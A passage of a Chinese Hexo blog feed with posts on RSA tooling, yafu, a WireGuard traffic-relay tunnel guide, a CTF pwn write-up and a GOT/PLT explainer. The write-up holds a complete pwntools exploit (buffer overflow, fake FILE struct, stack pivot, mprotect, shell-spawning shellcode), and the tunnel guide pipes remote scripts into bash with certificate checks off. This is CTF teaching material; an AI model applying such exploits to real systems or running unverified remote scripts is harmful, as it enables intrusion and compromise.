class="keyword">import</span> invert</span><br><span class="line">d = invert(e,phi)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> gmpy2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yafu安装及使用</title>
      <link href="archives/18/"/>
      <url>archives/18/</url>
      
        <content type="html"><![CDATA[<h1 id="yafu安装及使用"><a href="#yafu安装及使用" class="headerlink" title="yafu安装及使用"></a>yafu安装及使用</h1><p>yafu用于自动整数因式分解，<strong>在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值</strong>，原理是使用Fermat方法与Pollard rho方法等。</p><p>如果 p 与 q 相差较大（小），使用 yafu 可以很快分解出来。如果 n 较大，且经过几轮分解都没有得出结果，对于 ctf 题目来说，应该有其他解法。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>yafu 基本覆盖全平台。反正功能一样，选择最简便安装方法–Windows 下安装。</p><p>打开<a href="https://sourceforge.net/projects/yafu/">下载地址</a>，下载后解压即可使用。解压后有两个版本，根据自己系统位数选择（下文使用 x64 版本）。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>使用 cmd 进入到 yafu 所在目录下，或将目录加入到系统环境 PATH 变量，或打开目录文件夹后 shift+右键 选择在此处打开 powershell 。</p></li><li><p>假如要分解因数 6 ，输入命令：<code>.\yafu-x64.exe &quot;factor(6)&quot;</code>。</p></li><li><p>如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。<strong>文件最后一行一定要换行，否则eof; done processing batchfile</strong>。</p><p>运行命令：<code>.\yafu-x64.exe &quot;factor(@)&quot; -batchfile data.txt</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> yafu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组建隧道中转流量（自建IPLC实现落地）</title>
      <link href="archives/e258fe4d/"/>
      <url>archives/e258fe4d/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>突然之前，电报群热烈讨论“隧道中转流量”。非常好奇这是什么技术，本着不懂就问的真理，询问大佬。大佬回答是： 10 块包安装。emmm……生命不息，折腾不止！我自己研究去吧！Google、Baidu 一圈后，在知乎上找到较为贴切问题的帖子，出自大佬 <a href="https://www.zhihu.com/people/icodex">@iCodex</a> （帖子链接见文末）。</p><p>我也是刚刚了解 隧道 方面的知识，如有错误请大佬指出。</p><h2 id="2-IPLC、MPLS、隧道"><a href="#2-IPLC、MPLS、隧道" class="headerlink" title="2. IPLC、MPLS、隧道"></a>2. IPLC、MPLS、隧道</h2><p>我们目标建立的“隧道”概念，与 IPLC 有类似之处，所以先来了解一下。IPLC 粗暴点理解就是专线，直接用网线连接两边用户，不需要经过宽带运营商的机房。具体请看图：</p><p><img src="https://img-blog.csdnimg.cn/20200219182140683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>那什么是 MPLS ？实际上我们无法通过软件手段实现物理层面上的两台服务器直接相连，不能完全达到 IPCL 的效果。所以将通过软件手段实现的“类 IPCL ”称为 MPLS。</p><p>至于 隧道 可以理解为一条通过软件构建的虚拟的网线，它直接连接两台服务器的。构建完成的架构图：</p><p><img src="https://img-blog.csdnimg.cn/20200219182149210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-进一步了解隧道"><a href="#3-进一步了解隧道" class="headerlink" title="3. 进一步了解隧道"></a>3. 进一步了解隧道</h2><p>就我目前了解，隧道的实现方案有两类：</p><ul><li>使用 Zerotier、WireGuard 。将两台服务器组建在一个内网中，完成隧道部署后，两台机器就相当于在同一 WIFI 下的两台电脑，数据在内网中直接传输。</li><li>使用 Stunnel、GOST 的 TLS 加密隧道。服务器 A 将数据加密后传输，到达服务器 B 后，服务器 B 解密转发到目标服务器（如 油土鳖等）</li></ul><p>第二类方案操作比较简单，理解起来也比较容易，但缺点是 TLS 等加密方案大多都是基于 TCP 的，所以对这类隧道对 UDP 的支持较差。而第一类方案可以较好地支持 UDP 转发，但由于本身是特定的加密协议，特征较为明显，且 WireGuard 基于 UDP，对大陆的网络环境适应性不太好（易受宽带运营商 Qos 影响）。</p><p><em>—-摘选自<a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">利用 GOST 搭建加密中转隧道</a></em></p><p>两者较大的区别就是第一类方案会在每台主机上虚拟出一张网卡，并且虚拟网卡都在同一个网段。是不是有点熟悉？对没有错，就是内网穿透的感觉。</p><h2 id="4-隧道-与-iptables-等转发流量区别"><a href="#4-隧道-与-iptables-等转发流量区别" class="headerlink" title="4. 隧道 与  iptables 等转发流量区别"></a>4. 隧道 与  iptables 等转发流量区别</h2><p>在了解到隧道之前，我印象中中转服务器基本上都是使用 iptables 或者 socat 等工具，直接转发数据包（流量）到落点服务器。 在这种转发方式中，中转服务器没有对数据包进行任何操作（如：加密），仅仅转发数据包到落地服务器。而在 隧道 中的中转服务器有对数据包进行处理。具体请看图：</p><p><img src="https://img-blog.csdnimg.cn/20200219182158764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkyMTIzOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-使用-WireGuard-组建隧道"><a href="#5-使用-WireGuard-组建隧道" class="headerlink" title="5. 使用 WireGuard 组建隧道"></a>5. 使用 WireGuard 组建隧道</h2><p>我选择的是第一种方法搭建 隧道 ，选择的工具是 WireGuard 。如果想了解用第二类方案实现，请看<a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">这篇帖子</a>。</p><p>顺带说一嘴，这个工具可以用做家庭 NAS 的内网穿透。工具还可以选择 Zerotier ，这个带 Web 管理，但服务器在国外，为了更好的链接体验，可以百度一下搭建一个 moon节点 加速。</p><p>WireGuard 服务器客户端一体，依据配置文件区分。<a href="https://www.wireguard.com/install/">官网</a>有详尽的安装命令，实在看不懂英文翻译一下。这里给出大佬们的一键脚本。</p><p>Debian（萌咖）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -qO- &amp;#039;https://moeclub.org/attachment/LinuxShell/wireguard.sh&amp;#039;| bash</span><br></pre></td></tr></table></figure><p>Ubuntu(atrandys)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/atrandys/wireguard/master/wireguard_install_ubuntu.sh &amp;amp;&amp;amp; chmod +x wireguard_install_ubuntu.sh &amp;amp;&amp;amp; ./wireguard_install_ubuntu.sh</span><br></pre></td></tr></table></figure><p>CentOS(atrandys)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;amp;&amp;amp; wget https://raw.githubusercontent.com/atrandys/wireguard/master/wireguard_install.sh &amp;amp;&amp;amp; chmod +x wireguard_install.sh &amp;amp;&amp;amp; ./wireguard_install.sh</span><br></pre></td></tr></table></figure><hr><p>落地服务器我们用作 wireguard 服务端，中转服务器用作 客户端。</p><p><strong>先在 落地服务器 安装</strong>，使用 一键脚本 完成安装后会在 <code>/etc/wireguard</code> 目录下生成有：一对客户端key、一对服务端key、<strong>服务端配置文件</strong>、<strong>客户端配置文件</strong>。</p><p>服务端配置文件：wg0.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey &#x3D; &lt;服务端私钥&gt;</span><br><span class="line"># 组建内网服务端内网地址，NAT机器可能与原有网段冲突，请修改</span><br><span class="line">Address &#x3D; 10.0.0.1&#x2F;24 </span><br><span class="line">PostUp   &#x3D; iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">PostDown &#x3D; iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">ListenPort &#x3D; &lt;监听端口&gt;</span><br><span class="line">DNS &#x3D; 8.8.8.8</span><br><span class="line">MTU &#x3D; 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; &lt;客户端公钥&gt;</span><br><span class="line"># 组建内网服务端内网地址</span><br><span class="line">AllowedIPs &#x3D; 10.0.0.2&#x2F;32</span><br></pre></td></tr></table></figure><p>客户端配置文件：client.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Interface]</span><br><span class="line">PrivateKey &#x3D; &lt;客户端私钥&gt;</span><br><span class="line">Address &#x3D; 10.0.0.2&#x2F;24 </span><br><span class="line">DNS &#x3D; 8.8.8.8</span><br><span class="line">MTU &#x3D; 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey &#x3D; &lt;服务端公钥&gt;</span><br><span class="line"># 客户端公网IP:监听端口</span><br><span class="line">Endpoint &#x3D; 173.242.120.211:53115</span><br><span class="line">AllowedIPs &#x3D; 0.0.0.0&#x2F;0, ::0&#x2F;0</span><br><span class="line">PersistentKeepalive &#x3D; 25</span><br></pre></td></tr></table></figure><p>使用 Xshell 之类工具，将 clien.conf 下载到本地电脑待用。以相同方法在 中转服务器 上安装 wireguard 。安装完成后，将本地电脑的 client.conf 上传到中转服务器的 <code>/etc/wireguard</code> 。<strong>记得是覆盖上传！！！覆盖！！！</strong></p><p>如无意外，隧道已经搭建完成了。启动隧道：</p><p>落地服务器（服务端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br></pre></td></tr></table></figure><p>中转服务器（客户端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up cleint</span><br></pre></td></tr></table></figure><p>隧道启动完成，中转服务器流量会经落地服务器发出。可以测试一下：在中转服务器执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl zx2c4.com/ip</span><br></pre></td></tr></table></figure><p>返回的应该落地服务器的IP。至此 隧道中转流量 搭建完成。</p><p>怎么使用？你仅需要在中转服务器上安装 喜闻乐见的程序 ，开启隧道，你全部流量就会最终从落地服务器发出。不信你连接上 喜闻乐见的程序 后，去查查你的IP。</p><h2 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h2><p>使用 隧道 转发流量和使用 iptables 转发流量，速度谁更快？我并没有对比，所以不知道。电报大佬说是 隧道 更快一点，但没有指明是哪种 隧道 方案。毕竟高峰期 TCP 与 UDP 差距是存在的。安全性的话，隧道 进行二次加密比单次加密的 iptables，在理论上安全性更高，毕竟多一次加密等于你家多一道门一样。但是，隧道 加密的特征可能被容易识别出来。</p><p>总结：说了等于没说，你们自己测试去吧。我家境贫寒。</p><h2 id="7-wireguard-常用命令"><a href="#7-wireguard-常用命令" class="headerlink" title="7. wireguard 常用命令"></a>7. wireguard 常用命令</h2><p>使用 <code>/etc/wireguard/</code> 下的配置启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up &amp;lt;配置名&amp;gt;</span><br></pre></td></tr></table></figure><p>关闭&amp;&amp;停止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wg-quick down &amp;lt;启动时用的配置名&amp;gt;</span><br></pre></td></tr></table></figure><p>查看运行状态&amp;&amp;链接信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 输入无显示，则为未启动</span></span><br><span class="line">wg show</span><br><span class="line">或</span><br><span class="line">wg</span><br></pre></td></tr></table></figure><h2 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8. 参考链接"></a>8. 参考链接</h2><ul><li><a href="https://www.40huo.cn/blog/gost-tls-tunnel.html">利用 GOST 搭建加密中转隧道</a></li><li><a href="https://icodex.org/2020/02/vps-and-virtual-machines-how-to-get-an-iplc-like-experience/">VPS虚拟机如何自建“iplc”</a></li><li><a href="https://zhuanlan.zhihu.com/p/106004065">教你玩自建“IPLC” 轻松玩落地</a></li><li><a href="https://www.wireguard.com/">WireGuard</a></li><li><a href="https://www.v2ex.com/">还有一个v2ex帖子找不到了就贴官网吧</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 隧道 </tag>
            
            <tag> wireguard </tag>
            
            <tag> 中转流量 </tag>
            
            <tag> IPLC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届百度杯线上初赛 try to pwn</title>
      <link href="archives/34562184/"/>
      <url>archives/34562184/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目涉及：</p><ul><li>伪造文件流（FILE Stream）</li><li>调整栈帧（stack pivot）</li></ul></blockquote><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>题目给的是一个32位静态编译的程序，保护开启情况如图：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116181500.png"></p><p>程序的大概业务流程是打开名为<code>输入名称+随机数文件的随机内容</code>的文件，然后可以读取并输出这个文件的内容。</p><p>在 welcome 函数读入用户名时，没有限制输入长度，存在缓冲区溢出。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116183003.png"></p><p>变量 x 位于 bss 段，文件指针 dword_80EFA00 也位于 bss 段，与 x 位置关系如图：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116184722.png"></p><p>存储控制 x 输入内容，可以覆写文件指针 dword_80EFA00。程序最后调用了 fclose ，所以可以更改虚表指针来劫持控制流。</p><p>根据FILE结构，在 bss 段伪造出一个类似的结构，然后控制FILE里面的函数指针，执行任意代码。例如：执行<code>fclose(fileexample)</code>相当于调用 fileexample 这个文件(file)结构体虚表结构的 close 函数指针。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200116192212.png"></p><p>成功劫持文件流后，有一次调用机会（顺序执行一遍代码）。题目开启了 NX 保护，不能执行栈上 shellcode 。采取的解决办法是：先调整栈帧、扩充栈空间，使用 mprotect 函数改权限，让新的栈空间有可执行权限。</p><p>:link:<a href="https://blog.csdn.net/roland_sun/article/details/33728955">Linux中mprotect()函数的用法</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;unistd.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;sys/mmap.h&amp;gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>mprotect 地址是用 gdb 加载程序后，print mprotect 查到。（无PIE）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;<span class="comment">#039;./fake&amp;#039;)</span></span><br><span class="line"><span class="comment">#p = remote(&amp;quot;106.75.2.53&amp;quot;,10007)</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x08071fd0</span></span><br><span class="line"><span class="comment"># ROPgadget --binary fake --only &amp;quot;pop|ret&amp;quot;</span></span><br><span class="line">pop_esp_ret = <span class="number">0x080e2b6d</span></span><br><span class="line"><span class="comment"># ROPgadget --binary fake --only &amp;quot;xchg|ret&amp;quot;</span></span><br><span class="line">xchg_esp_eax_ret = <span class="number">0x08048f66</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * 32 # fill up x</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">4</span>) <span class="comment"># FILE Pointer point to fake file</span></span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>) * (<span class="number">148</span> / <span class="number">4</span>) <span class="comment"># fake file</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">156</span>) <span class="comment"># fake file ending &amp;amp; point to gadget</span></span><br><span class="line">payload += p32(pop_esp_ret)</span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">200</span>) <span class="comment"># stack pivot to enlarge 200 </span></span><br><span class="line">payload += p32(xchg_esp_eax_ret)</span><br><span class="line">fill_up = <span class="number">200</span> - <span class="built_in">len</span>(payload) + <span class="number">32</span></span><br><span class="line">payload += &amp;<span class="comment">#039;b&amp;#039; * fill_up</span></span><br><span class="line">payload += p32(mprotect_addr) <span class="comment"># call mprotect</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">200</span> + <span class="number">20</span>) <span class="comment"># ret to shellcode</span></span><br><span class="line">payload += p32(<span class="number">0x080ef000</span>) <span class="comment"># argv 1</span></span><br><span class="line">payload += p32(<span class="number">1024</span>) <span class="comment"># argv 2</span></span><br><span class="line">payload += p32(<span class="number">7</span>) <span class="comment"># argv 3</span></span><br><span class="line">payload += encoders.encoder.line(asm(shellcraft.sh())) <span class="comment"># shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send name(payload)</span></span><br><span class="line">p.recvuntil(&amp;quot;name?&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># exit to run fclose</span></span><br><span class="line">p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">3</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200117004101.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 百度杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GOT和PLT | GOT and PLT for pwning</title>
      <link href="archives/59516ce6/"/>
      <url>archives/59516ce6/</url>
      
        <content type="html"><![CDATA[<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>二进制文件有两种类型：静态链接和动态链接。静态链接二进制文件包含运行需要的全部代码，不要加载外部库。动态链接没有包含全部代码，需要加载系统库来运行。</p><p>假设动态链接二进制文件加载（调用）系统库使用硬编码地址（绝对地址），那么系统库发生变化，二进制文件内的硬编码地址很可能全部改变。所以提出了一个<strong>重定向</strong>机制。</p><p><code>.got</code>、<code>.plt</code>、<code>.got.plt</code>、<code>链接器</code>等是重定向的组成成分。</p><h2 id="重定位表（relocations）"><a href="#重定位表（relocations）" class="headerlink" title="重定位表（relocations）"></a>重定位表（relocations）</h2><h3 id="got"><a href="#got" class="headerlink" title=".got"></a><strong>.got</strong></h3><p>全局偏移表。用于记录在 ELF （二进制）文件中所用到的共享库中函数（或字符串）的绝对地址。</p><p>在程序刚开始运行时，GOT 表为空的，当函数<em>第一次被调用</em>时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中；第二次调用同一函数时，由于 GOT 中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。（结合 <strong>.got.plt</strong> 理解）</p><h3 id="got-plt"><a href="#got-plt" class="headerlink" title=".got.plt"></a><strong>.got.plt</strong></h3><p>got 表中的一部分。用于重定向请求到 .got 上的对应偏移或者返回 .plt 中激活链接器寻找函数在 系统库 中的地址。</p><p>开始运行是 .got.plt 不为空。当 got 表中没有函数的记录值时，会把从 .plt 进入 .got.plt 的进程重定向到 .plt 中激活链接器，寻址完成后，.got 记录函数在系统库偏移，.got.plt 会记录函数在 .got 偏移。</p><h3 id="plt"><a href="#plt" class="headerlink" title=".plt"></a>.plt</h3><p>程序链接表。是调用系统库函数最开始的入口。它有两个功能，在 .got.plt 节中拿到地址，并跳转；当 .got.plt 没有所需地址的时，触发「链接器」去找到所需函数地址。</p><h3 id="plt-got"><a href="#plt-got" class="headerlink" title=".plt.got"></a>.plt.got</h3><p>没有太准确的相关资料，在 stackoverflow 上面有一个<a href="https://stackoverflow.com/questions/58076539/plt-plt-got-what-is-different">帖子</a>提及，原文如下：</p><blockquote><p>The difference is that .got.plt is runtime-writable, while .got is not if you enable a defense against GOT overwriting attacks called RELRO (relocations read-only). To enable RELRO, you use the ld option -z relro. RELRO places GOT entries that must be runtime-writable for lazy binding in .got.plt, and all others in the read-only .got section</p></blockquote><p>没太看懂，大概说 .got.plt 在运行时是可读写。但是当开启 RELRO 时，.got 是不可写的。</p><p>调用系统库函数</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-24-eCAUdO88GUhYXSRv.png"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>引用自：<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT and PLT for pwning</a></p></blockquote><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Build with: gcc -m32 -no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">pwndbg&gt; info files</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> maintenance info sections</span></span><br><span class="line"></span><br><span class="line">There are 36 section headers, starting at offset 0x1fb4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048340 000340 0001a2 00  AX  0   0 16</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</span><br></pre></td></tr></table></figure><p>gdb 反编译 main 函数，call 函数下断点，单步调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disass main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804843b &lt;+0&gt;:lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804843f &lt;+4&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x08048442 &lt;+7&gt;:push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048445 &lt;+10&gt;:push   ebp</span><br><span class="line">   0x08048446 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">   0x08048448 &lt;+13&gt;:push   ebx</span><br><span class="line">   0x08048449 &lt;+14&gt;:push   ecx</span><br><span class="line">   0x0804844a &lt;+15&gt;:call   0x8048370 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x0804844f &lt;+20&gt;:add    ebx,0x1bb1</span><br><span class="line">   0x08048455 &lt;+26&gt;:sub    esp,0xc</span><br><span class="line">   0x08048458 &lt;+29&gt;:lea    eax,[ebx-0x1b00]</span><br><span class="line">   0x0804845e &lt;+35&gt;:push   eax</span><br><span class="line">   0x0804845f &lt;+36&gt;:call   0x8048300 &lt;puts@plt&gt;</span><br><span class="line">   0x08048464 &lt;+41&gt;:add    esp,0x10</span><br><span class="line">   0x08048467 &lt;+44&gt;:sub    esp,0xc</span><br><span class="line">   0x0804846a &lt;+47&gt;:push   0x0</span><br><span class="line">   0x0804846c &lt;+49&gt;:call   0x8048310 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">break</span> *0x0804845f</span></span><br><span class="line">Breakpoint 1 at 0x804845f: file plt.c, line 7.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Breakpoint *0x0804845f</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/i <span class="variable">$pc</span></span></span><br><span class="line">=&gt; 0x804845f &lt;main+36&gt;:call   0x8048300 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><p>debug 到 call 函数，用 si 单步入进入 plt 函数里面，否则直接调 puts 代码。可以用<code>x/i $pc</code>查汇编，或者<code>disass 0x8048300</code>反编译一样能看到跳转的 .got.plt 地址 0x804a00c 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> si</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/i <span class="variable">$pc</span></span></span><br><span class="line">=&gt; 0x8048300 &lt;puts@plt&gt;:jmp    DWORD PTR ds:0x804a00c</span><br></pre></td></tr></table></figure><p>查询 .got.plt 的跳转地址，是跳转回 .plt 。因为第一次调用 .got 表没有记录，需要跳转 .plt 激活链接器寻址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 